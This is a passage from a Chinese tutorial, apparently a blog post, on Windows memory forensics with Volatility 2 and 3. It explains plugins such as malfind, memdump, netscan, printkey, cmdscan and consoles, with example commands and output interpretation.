&lt;p&gt;&lt;strong&gt;Name&lt;/strong&gt;：该 SID 对应的通用名称&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;一个进程会对应多个SID，是因为一个进程的访问令牌中，不仅包含了其主要运行身份的SID，还包含了该身份所属的所有用户组的SID，这些SID共同决定了该进程的权限&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;例如，System(PID:4)这个进程，它关联了多个SID：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;S-1-5-18 (Local System)&lt;/strong&gt;：这是它的主身份，代表了系统的最高权限&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;S-1-5-32-544 (Administrators)&lt;/strong&gt;：表明它也属于管理员组&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;S-1-1-0 (Everyone)&lt;/strong&gt;：表明它也属于Everyone组&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;查看可能的恶意代码malfind&#34;&gt;查看可能的恶意代码（malfind）
&lt;/h3&gt;&lt;h4 id=&#34;volatility2-15&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; malfind
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250714104850074.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250714104850074&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;volatility2还有一个社区插件，是malfind的深度扫描版本malfinddeep：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/superponible/volatility-plugins&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/superponible/volatility-plugins
    
    &lt;span style=&#34;white-space: nowrap;&#34;&gt;&lt;svg width=&#34;.7em&#34;
        height=&#34;.7em&#34; viewBox=&#34;0 0 21 21&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;
        &lt;path d=&#34;m13 3l3.293 3.293l-7 7l1.414 1.414l7-7L21 11V3z&#34; fill=&#34;currentColor&#34; /&gt;
        &lt;path d=&#34;M19 19H5V5h7l-2-2H5c-1.103 0-2 .897-2 2v14c0 1.103.897 2 2 2h14c1.103 0 2-.897 2-2v-5l-2-2v7z&#34;
            fill=&#34;currentColor&#34;&gt;
    &lt;/svg&gt;&lt;/span&gt;
    
&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; malfinddeep
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;volatility3-15&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f MemoryDump_Lab5.raw windows.malware.malfind.Malfind
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250714104152510.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250714104152510&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;提取进程内存memdumpdump&#34;&gt;提取进程内存（memdump/&amp;ndash;dump）
&lt;/h3&gt;&lt;p&gt;进程内存中潜藏着很多信息，把他们提取出来才能更好的做分析&lt;/p&gt;
&lt;p&gt;比如TrueCrypt进程中会有加密密钥，导出其为.dmp文件后，可以交给EFDD解密加密卷&lt;/p&gt;
&lt;h4 id=&#34;volatility2-16&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; memdump -p &amp;lt;PID&amp;gt; -D &amp;lt;保存路径&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;提取后的文件为.dump，存储了进程所有的数据，可以在里面搜索目标字符串等&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果进程里有想要的文件，可以使用foremost分离文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果目标比较明显（比如图片），也可以用mv命令修改文件后缀再打开，再在里面找目标文件&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;volatility3-16&#34;&gt;Volatility3
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;vol3不再有单独的dump插件，直接在&lt;code&gt;PsList&lt;/code&gt;插件使用&lt;code&gt;--dump&lt;/code&gt;选项：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3  -f &amp;lt;内存镜像&amp;gt; -o &amp;lt;保存路径&amp;gt; windows.pslist.PsList --pid &amp;lt;PID&amp;gt; --dump
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;这里的&lt;code&gt;-o&lt;/code&gt;选项用于指定导出文件的路径，必须放在&lt;code&gt;-f&lt;/code&gt;选项后一个！！&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;网络活动分析&#34;&gt;网络活动分析
&lt;/h2&gt;&lt;h3 id=&#34;查看网络连接netscannetstat&#34;&gt;查看网络连接（netscan/netstat）
&lt;/h3&gt;&lt;h4 id=&#34;volatility2-17&#34;&gt;Volatility2
&lt;/h4&gt;&lt;p&gt;查看当前以及历史、隐藏网络链接（这个是XP时代的工具了，很老，不一定有用）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; connscan
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查看当前网络链接：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; netscan
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250714113947510.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250714113947510&#34;
	
	
&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;LISTENING&lt;/code&gt;&lt;/strong&gt;：表示某个程序正在一个端口上“监听”，等待外部连接的建立&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;ESTABLISHED&lt;/code&gt;&lt;/strong&gt;：表示一个 TCP 连接已经成功建立，双方正在进行数据通信&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;CLOSED&lt;/code&gt;/&lt;code&gt;TIME_WAIT&lt;/code&gt;/&lt;code&gt;SYN_SENT&lt;/code&gt;&lt;/strong&gt;：表示各种已关闭或正在建立/关闭过程中的连接状态&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;UDP 是无连接的协议，所以它没有 &lt;code&gt;State&lt;/code&gt;（状态）字段&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;我们可以从中筛选已经建立链接的项：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; netscan | grep ESTABLISHED 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果当前系统中存在挖矿进程，网络连接列表又太长，就可以借此筛选，获取到矿池地址&lt;/p&gt;
&lt;p&gt;或者也可以根据提供的pid把它dump下来具体分析&lt;/p&gt;
&lt;h4 id=&#34;volatility3-17&#34;&gt;Volatility3
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;更加建议使用NetStat，报告更赏心悦目：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.netstat.NetStat
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250714114505605.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250714114505605&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;当然，vol3也是有NetScan的：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.netscan.NetScan
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250714113608063.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250714113608063&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;注册表分析&#34;&gt;注册表分析
&lt;/h2&gt;&lt;h3 id=&#34;查看注册表整体结构hivelist&#34;&gt;查看注册表整体结构（hivelist）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;hivelist&lt;/code&gt;的主要作用是为后续的&lt;code&gt;printkey&lt;/code&gt;等插件提供每个Hive的虚拟地址（第一列）&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;volatility2-18&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; hivelist
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250704132014554.png&#34; alt=&#34;image-20250704132014554&#34;  /&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;ntuser.dat&lt;/code&gt;&lt;/strong&gt;：用户的注册表文件，这里表明Alissa Simpson和SmartNet是登录状态或近期登录过&lt;/p&gt;
&lt;h4 id=&#34;volatility3-18&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.registry.hivelist.HiveList
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250714193939822.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250714193939822&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;查看具体注册表项printkey&#34;&gt;查看具体注册表项（printkey）
&lt;/h3&gt;&lt;h4 id=&#34;volatility2-19&#34;&gt;Volatility2
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;使用逻辑路径：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; printkey -K &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;顶层路径\子路径&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;一定是从对应的hive开始，比如&lt;code&gt;SAM&lt;/code&gt;，&lt;code&gt;SECURITY&lt;/code&gt;等，而不是那五个根键：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250714194449147.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250714194449147&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;也可以使用虚拟地址：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; printkey -o 虚拟地址
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250714194807769.png&#34; alt=&#34;image-20250714194807769&#34; style=&#34;zoom:150%;&#34; /&gt;
&lt;p&gt;&lt;strong&gt;再根据结果返回的&lt;code&gt;SubKeys&lt;/code&gt;使用-K参数：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2  -f  &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; -o 虚拟地址 printkey -K &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;子键名称&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250714194911155.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250714194911155&#34;
	
	
&gt;&lt;/p&gt;
&lt;h4 id=&#34;volatility3-19&#34;&gt;Volatility3
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;vol3只指定路径会去所有hive中寻找，需要使用逻辑路径＋虚拟地址才能精确定位：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.registry.printkey.PrintKey --offset 虚拟地址 --key &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;顶层路径\子路径&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250714195649342.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250714195649342&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;用户活动与执行历史&#34;&gt;用户活动与执行历史
&lt;/h2&gt;&lt;h3 id=&#34;查看cmd历史命令cmdscan&#34;&gt;查看cmd历史命令（cmdscan）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;输出干净，有时能找到超出缓冲区范围的命令，即使已经清屏&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;但没有命令的输出结果，且只限于cmd&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;volatility2-20&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; cmdscan
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250714200632869.png&#34; alt=&#34;image-20250714200632869&#34; style=&#34;zoom:150%;&#34; /&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;Application：DumpIt.exe&lt;/code&gt;&lt;/strong&gt;：Volatility在内存中定位到的这个命令历史记录区是属于&lt;code&gt;DumpIt.exe&lt;/code&gt;的&lt;/p&gt;
&lt;p&gt;这里cmdcount=0，说明没有发现cmd命令&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;DumpIt.exe&lt;/code&gt;是于快速创建物理内存完整转储的工具，也就是创建这个&amp;lt;内存镜像&amp;gt;用的&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;volatility3-20&#34;&gt;Volatility3
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;vol3对于win7等老系统可能不支持，分析会报错，使用时注意&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.cmdscan.CmdScan
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250714203803483.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250714203803483&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.概览信息&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;PID     Process     ConsoleInfo     Property                Address         Data
2084    conhost.exe 0x1445c89b900   _COMMAND_HISTORY        0x1445c89b900   None
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这部分告诉我们，在 PID 为&lt;code&gt;2084&lt;/code&gt;的&lt;code&gt;conhost.exe&lt;/code&gt;进程中，于内存地址&lt;code&gt;0x1445c89b900&lt;/code&gt;处，找到了一个&lt;code&gt;_COMMAND_HISTORY&lt;/code&gt;（命令历史）的数据结构&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.历史记录的元数据&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;下面几行带单个&lt;code&gt;*&lt;/code&gt;的是这个历史记录本身的属性：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;* 2084  conhost.exe ... _COMMAND_HISTORY.Application  ... cmd.exe
* 2084  conhost.exe ... _COMMAND_HISTORY.CommandCount ... 3
* 2084  conhost.exe ... _COMMAND_HISTORY.CommandCountMax ... 50
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Application：cmd.exe&lt;/code&gt;&lt;/strong&gt;：表明这个命令行窗口的应用程序是&lt;code&gt;cmd.exe&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;CommandCount：3&lt;/code&gt;&lt;/strong&gt;：它表示在这个命令历史缓冲区中，一共记录了3条命令&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;CommandCountMax：50&lt;/code&gt;&lt;/strong&gt;：表示这个缓冲区最多可以记录50条命令&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;3.恢复出的命令内容&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;下面带两个星号&lt;code&gt;**&lt;/code&gt;的部分是用户输入过的命令：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;** 2084 conhost.exe ... CommandBucket_Command_0 ... ping easyforensics.com
** 2084 conhost.exe ... CommandBucket_Command_1 ... ipconfig
** 2084 conhost.exe ... CommandBucket_Command_2 ... ping easyforensics.com
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;CommandBucket_Command_X&lt;/code&gt;&lt;/strong&gt;：代表历史记录缓冲区中的第 X 个槽位&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Data 列&lt;/strong&gt;：清晰地显示了用户按顺序输入的三条命令：
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;ping easyforensics.com&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ipconfig&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ping easyforensics.com&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;查看控制台完整交互consoles&#34;&gt;查看控制台完整交互（consoles）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;&lt;code&gt;consoles&lt;/code&gt;不仅能看到输入的命令，还能看到命令返回的输出结果，只要是conhost.exe控制的交互式窗口(cmd、poweshell等)就能提取&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;但它受缓冲区大小限制，只寻找当前屏幕缓冲区的内容，如果清屏了(&lt;code&gt;cls&lt;/code&gt;)就找不到了&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;volatility2-21&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; consoles
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250714202855628.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250714202855628&#34;
	
	
&gt;&lt;/p&gt;
&lt;h4 id=&#34;volatility3-21&#34;&gt;Volatility3
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;vol3对于win7等老系统可能不支持，分析会报错，使用时注意&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.consoles.Consoles
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250714201124616.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250714201124616&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;此处显示未找到控制台信息&amp;quot;Console Information Not Found&amp;quot;&lt;/p&gt;
&lt;h3 id=&#34;查看gui程序执行记录userassist&#34;&gt;查看GUI程序执行记录（userassist）
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;展示用户通过GUI启动的程序（点击快捷方式、开始菜单等）的信息，证明用户的主动操作行为&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;它只记录explorer.exe，不接受cmd.exe/powershell.exe，不能看见用户通过命令行启动的程序&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;volatility2-22&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; userassist
